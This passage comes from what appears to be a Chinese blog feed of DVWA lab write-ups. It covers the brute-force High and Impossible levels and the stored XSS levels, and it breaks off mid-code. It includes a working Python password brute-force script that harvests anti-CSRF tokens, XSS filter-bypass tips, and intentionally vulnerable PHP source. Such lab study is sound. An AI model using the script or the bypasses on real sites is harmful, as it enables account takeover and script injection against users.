sleep 两秒</p><br><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerabilities/brute/source/high.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitise username input</span></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"><span class="variable">$user</span> = stripslashes( <span class="variable">$user</span> );</span><br><span class="line"><span class="variable">$user</span> = mysql_real_escape_string( <span class="variable">$user</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitise password input</span></span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass</span> = stripslashes( <span class="variable">$pass</span> );</span><br><span class="line"><span class="variable">$pass</span> = mysql_real_escape_string( <span class="variable">$pass</span> );</span><br><span class="line"><span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check database</span></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysql_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line"><span class="comment">// Get users details</span></span><br><span class="line"><span class="variable">$avatar</span> = mysql_result( <span class="variable">$result</span>, <span class="number">0</span>, <span class="string">&quot;avatar&quot;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Login successful</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Login failed</span></span><br><span class="line">sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br/><p>High 在 Medium 的基础上增加了 token 机制，在页面中的 hidden 域里</p><p><img src="../img/Brute-Force/11.png" alt="Brute-Force"></p><p>每次都会生成新的 token，并且提交时要携带 token 参数并与服务器上的 token 进行对比，防止了无脑爆破，这里可以继续使用 burpsuite 来匹配 token，详细的步骤在 <a href="https://www.cnblogs.com/heycomputer/articles/10298850.html">链接</a> 里，我也尝试用 python 写了一个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">access_once</span>(<span class="params">password</span>):</span><span class="comment"># 请求一次</span></span><br><span class="line">p[<span class="string">&quot;password&quot;</span>] = password</span><br><span class="line">r = requests.get(url=u, headers=h, params=p)</span><br><span class="line"><span class="keyword">if</span> flag <span class="keyword">in</span> r.text:<span class="comment"># 判断是否登录成功</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Password Found: %s&quot;</span> % password)</span><br><span class="line">exit()</span><br><span class="line"><span class="keyword">elif</span> <span class="string">&quot;Vulnerability: Brute Force&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:<span class="comment"># 判断是否因为token错误返回登录页面</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Not in the target page, plz reset the initial token&quot;</span>)</span><br><span class="line">exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Testing: %s&quot;</span> % password)</span><br><span class="line">offset = r.text.find(<span class="string">&quot;user_token&quot;</span>)</span><br><span class="line">next_token = r.text[offset+<span class="number">19</span>:offset+<span class="number">51</span>]<span class="comment"># 获取下一个token</span></span><br><span class="line">p[<span class="string">&quot;user_token&quot;</span>] = next_token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_force</span>(<span class="params">dic_path</span>):</span></span><br><span class="line">pws = <span class="built_in">open</span>(<span class="string">&quot;test.txt&quot;</span>).read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> pw <span class="keyword">in</span> pws:</span><br><span class="line"><span class="keyword">if</span> pw != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">access_once(pw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">u = <span class="string">&quot;http://192.168.249.129/dvwa/vulnerabilities/brute/&quot;</span><span class="comment"># url路径</span></span><br><span class="line">p = &#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;password&quot;</span>:<span class="string">&quot;123&quot;</span>, <span class="string">&quot;Login&quot;</span>:<span class="string">&quot;Login&quot;</span>&#125;<span class="comment"># GET传参</span></span><br><span class="line">h = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=crc8f16n12orl898p045cdtvg7; security=high&quot;</span>&#125;<span class="comment">#cookie信息</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;Welcome to the password protected area admin&quot;</span><span class="comment"># 判断是否登录成功的字符串</span></span><br><span class="line">p[<span class="string">&quot;user_token&quot;</span>] = <span class="string">&quot;310efbd56d1e4f90f8f4fdfacae910b8&quot;</span><span class="comment"># 初始token, 需要手动获取</span></span><br><span class="line">dictionary = <span class="string">&quot;test.txt&quot;</span><span class="comment"># 字典路径</span></span><br><span class="line">brute_force(dictionary)</span><br></pre></td></tr></table></figure><p>获取初始 token 的方法是在浏览器页面空白处 <strong>右键-&gt;查看页面源代码</strong>，找到形似如下代码的隐藏域，value 的值即为 token</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;hidden&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;user_token&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;310efbd56d1e4f90f8f4fdfacae910b8&#x27;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="../img/Brute-Force/12.png" alt="Brute-Force"></p><br><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerabilities/brute/source/impossible.php</span></span><br><span class="line"><span class="comment">// 仅展示一些关键代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Default values</span></span><br><span class="line"><span class="variable">$total_failed_login</span> = <span class="number">3</span>;</span><br><span class="line"><span class="variable">$lockout_time</span>       = <span class="number">15</span>;</span><br><span class="line"><span class="variable">$account_locked</span>     = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check the database (Check user information)</span></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line"><span class="variable">$data</span>-&gt;execute();</span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check to see if the user has been locked out.</span></span><br><span class="line"><span class="keyword">if</span>( ( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( <span class="variable">$row</span>[ <span class="string">&#x27;failed_login&#x27;</span> ] &gt;= <span class="variable">$total_failed_login</span> ) )  &#123;</span><br><span class="line"><span class="comment">// Calculate when the user would be allowed to login again</span></span><br><span class="line"><span class="variable">$last_login</span> = <span class="variable">$row</span>[ <span class="string">&#x27;last_login&#x27;</span> ];</span><br><span class="line"><span class="variable">$last_login</span> = strtotime( <span class="variable">$last_login</span> );</span><br><span class="line"><span class="variable">$timeout</span>    = strtotime( <span class="string">&quot;<span class="subst">&#123;$last_login&#125;</span> +<span class="subst">&#123;$lockout_time&#125;</span> minutes&quot;</span> );</span><br><span class="line"><span class="variable">$timenow</span>    = strtotime( <span class="string">&quot;now&quot;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check to see if enough time has passed, if it hasn&#x27;t locked the account</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$timenow</span> &gt; <span class="variable">$timeout</span> )</span><br><span class="line"><span class="variable">$account_locked</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check the database (if username matches the password)</span></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR);</span><br><span class="line"><span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass</span>, PDO::PARAM_STR );</span><br><span class="line"><span class="variable">$data</span>-&gt;execute();</span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Had the account been locked out since last login?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$failed_login</span> &gt;= <span class="variable">$total_failed_login</span> ) &#123;</span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;p&gt;Number of login attempts: &lt;em&gt;<span class="subst">&#123;$failed_login&#125;</span>&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update bad login count</span></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line"><span class="variable">$data</span>-&gt;execute();</span><br></pre></td></tr></table></figure><p>可以看到，这里为用户设置了最多登录尝试次数，以及账户锁定的机制，在很大程度上限制了暴力枚举的攻击方式</p>]]></content>
      
      
      
        <tags>
            
            <tag> DVWA </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS (Stored)</title>
      <link href="/2020/02/27/XSS-Stored/"/>
      <url>/2020/02/27/XSS-Stored/</url>
      
        <content type="html"><![CDATA[<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><blockquote><p>分析</p></blockquote><p>上来先随便输个 Name 和 Message，可以看到我们的评论被添加在下面了</p><p><img src="../img/XSS-Stored/1.png" alt="XSS-Stored"></p><p>点到其他分栏再点回来时，仍旧存在</p><p>推测数据被放入了数据库中，每次访问网页会查询数据库，将所有的评论都显示出来</p><br><p>尝试在 Name 输入框输入 script 标签，然而句子还没输完就输不进去了，应该是有 maxlength 属性的限制</p><p>在 Name 输入框的位置 右键-&gt;查看元素，将 maxlength 改为 50</p><p><img src="../img/XSS-Stored/2.png" alt="XSS-Stored"></p><p>再输入就可以了</p><p><img src="../img/XSS-Stored/3.png" alt="XSS-Stored"></p><p>提交以后，每次访问这个网页都会弹两次窗…神烦233</p><br><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerabilities/xss_s/source/low.php</span></span><br><span class="line"><span class="comment">// 信息插入数据库</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line"><span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize message input</span></span><br><span class="line"><span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> );</span><br><span class="line"><span class="variable">$message</span> = mysql_real_escape_string( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize name input</span></span><br><span class="line"><span class="variable">$name</span> = mysql_real_escape_string( <span class="variable">$name</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update database</span></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>信息插入之时，通过一些安全函数（如 mysql_real_escape_string ），使得 SQL 注入失效</p><br><p>显示的时候，index.php 在 64 行处调用了 dvwaGuestbook 函数，这个函数在 dvwaPage.inc.php 中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dvwa/includes/dvwaPage.inc.php</span></span><br><span class="line"><span class="comment">// 查询、显示信息</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dvwaGuestbook</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT name, comment FROM guestbook&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> );</span><br><span class="line"></span><br><span class="line"><span class="variable">$guestbook</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>( <span class="variable">$row</span> = mysql_fetch_row( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line"><span class="keyword">if</span>( dvwaSecurityLevelGet() == <span class="string">&#x27;impossible&#x27;</span> ) &#123;</span><br><span class="line"><span class="variable">$name</span>    = htmlspecialchars( <span class="variable">$row</span>[<span class="number">0</span>] );</span><br><span class="line"><span class="variable">$comment</span> = htmlspecialchars( <span class="variable">$row</span>[<span class="number">1</span>] );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$name</span>    = <span class="variable">$row</span>[<span class="number">0</span>];</span><br><span class="line"><span class="variable">$comment</span> = <span class="variable">$row</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$guestbook</span> .= <span class="string">&quot;&lt;div id=\&quot;guestbook_comments\&quot;&gt;Name: <span class="subst">&#123;$name&#125;</span>&lt;br /&gt;&quot;</span> . <span class="string">&quot;Message: <span class="subst">&#123;$comment&#125;</span>&lt;br /&gt;&lt;/div&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$guestbook</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显示时只有当难度为 impossible，才会用 htmlspecialchars 转化为 html 实体，所以存在 XSS 漏洞，而且因为信息存储在服务器端，其他用户访问网页时，也会受到恶意脚本攻击，所以称其为存储型 XSS</p><br><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerabilities/xss_s/source/low.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line"><span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize message input</span></span><br><span class="line"><span class="variable">$message</span> = strip_tags( addslashes( <span class="variable">$message</span> ) );</span><br><span class="line"><span class="variable">$message</span> = mysql_real_escape_string( <span class="variable">$message</span> );</span><br><span class="line"><span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize name input</span></span><br><span class="line"><span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line"><span class="variable">$name</span> = mysql_real_escape_string( <span class="variable">$name</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update database</span></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>与我上一篇文章中写到的 <a href="https://in1nit1t.github.io/2020/02/27/XSS-Reflected/">反射型 XSS</a> medium 难度相似，对 name 输入框中的 &lt;script&gt; 做了替换，可以通过<strong>大小写，双写，加 src 属性，使用其他标签</strong>来绕过</p><p>而对 message 的内容则是调用了 htmlspecialchars 函数来将一些字符（如 &lt; &gt; 等）转换为 html 实体，也就是说这个输入框不能再被 XSS 漏洞利用了，但 name 输入框的内容仍能被视作 html 代码来解释</p><p>我们可以考虑在前端将 maxlength 的值改大，也可以考虑抓包直接修改 name 的值</p><p><img src="../img/XSS-Stored/4.png" alt="XSS-Stored"></p><br><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerabilities/xss_s/source/high.php</span></span><br><span class="line"><span class="comment">// 基本与 medium 相似，列出关键两句</span></span><br><span class="line"><span class="variable">$name</span> = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line"><span class="variable">$name</span> = mysql_real_escape_string( <span class="variable">$name</span> );</span><br></pre></td></tr></table></figure><br><p>加了正则，还是可以继续在 name 输入框用其他标签绕过</p><p><img src="../img/XSS-Stored/5.png" alt="XSS-Stored"></p><br><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerabilities/xss_s/source/impossible.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line"><span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize message input</span></span><br><span class="line"><span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> );</span><br><span class="line"><span class="variable">$message</span> = mysql_real_escape_string( <span class="variable">$message</span> );</span><br><span class="line"><span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize name input</span></span><br><span class="line"><span class="variable">$name</span> = stripslashes( <span class="variable">$name</span> );</span><br><span class="line"><span class="variable">$name</span> = mysql_real_escape_string( <span class="variable">$name</span> );</span><br><span class="line"><span class="variable">$name</span> = htmlspecialchars( <span class="variable">$name</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update database</span></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:message&#x27;</span>, <span class="variable">$message</span>, PDO::PARAM_STR );</span><br><span class="line"><span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:name&#x27;</span>, <span class="variable">$name</span>, PDO::PARAM_STR );</span><br><span class="line"><span class="variable">$data</span>-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// dvwa/includes/dvwaPage.inc.php</span></span><br><span class="line"><span class="variable">$name</span>    = htmlspecialchars( 